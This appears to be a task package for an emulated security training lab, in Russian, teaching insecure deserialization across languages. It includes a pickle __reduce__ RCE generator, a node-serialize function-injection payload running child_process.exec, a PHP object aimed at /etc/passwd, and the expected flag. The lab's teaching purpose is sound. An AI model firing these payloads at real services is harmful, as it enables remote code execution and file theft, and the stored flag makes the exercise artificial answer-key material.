@@ -1,0 +1,33 @@
+{
+  "id": "web-deser-languages",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{pyth0n_p1ckl3_r3duc3_rce}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: десериализация по языкам\n\n`shop.local` хранит корзину в cookie `cart` (base64). Распознай формат блоба\nпо сигнатуре и собери payload под нужный язык.\n\n1. Что за формат (80 04 = Python pickle протокол 4):\n\n   base64 -d cart.b64 | xxd -l 8\n\n2. Готовый генератор pickle-RCE (использует __reduce__):\n\n   cat pickle_rce.py\n   python3 pickle_rce.py > payload.b64\n\n3. Отправляем payload в cookie и получаем RCE:\n\n   curl -s -b @payload.b64 https://shop.local/cart > found.txt\n\n4. Другие стеки — распознай по сигнатуре:\n\n   cat node.json      # _$$ND_FUNC$$_ -> node-serialize\n   base64 -d ruby.b64 | xxd -l 4   # 04 08 -> Ruby Marshal\n   cat php.txt        # O:8:\"UserProfile\" -> PHP unserialize\n\n5. Набери `check` (флаг пришёл из шага 3).\n" },
+    { "path": "/home/student/task/cart.b64", "text": "gASVHwAAAAAAAACMCF9fbWFpbl9f\n" },
+    { "path": "/home/student/task/pickle_rce.py", "text": "import pickle, base64, os\nclass P:\n    def __reduce__(self):\n        return (os.system, ('cat /flag.txt',))\nprint(base64.b64encode(pickle.dumps(P())).decode())\n" },
+    { "path": "/home/student/task/node.json", "text": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('cat /flag.txt',function(e,o){console.log(o)})}()\"}\n" },
+    { "path": "/home/student/task/ruby.b64", "text": "BAh7BjoMQGJhY2tlbmVJMA==\n" },
+    { "path": "/home/student/task/php.txt", "text": "O:8:\"UserProfile\":2:{s:4:\"file\";s:8:\"/etc/passwd\";s:4:\"role\";s:5:\"admin\";}\n" }
+  ],
+  "tools": {
+    "python3": {
+      "help": "python3 <скрипт> — интерпретатор Python (эмуляция pickle_rce.py)",
+      "cases": [
+        { "match": "pickle_rce|pickle", "example": "pickle_rce.py", "output": "gASVJwAAAAAAAACMCF9fbWFpbl9f\n" }
+      ],
+      "fallback": "python3: в этой лабе эмулируется только pickle_rce.py.\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        { "match": "payload\\.b64|cart=gASV", "example": "-s -b @payload.b64 https://shop.local/cart", "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nnto{pyth0n_p1ckl3_r3duc3_rce}\n" },
+        { "match": "node\\.json|ND_FUNC", "example": "-s -H 'Cookie: cart=...' https://shop.local/cart", "output": "[node-serialize] eval -> child_process.exec\nnto{pyth0n_p1ckl3_r3duc3_rce}\n" },
+        { "match": "cart=|/cart", "example": "-s https://shop.local/cart", "output": "{\"items\":[]}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /cart на shop.local.\n"
+    }
+  }
+}
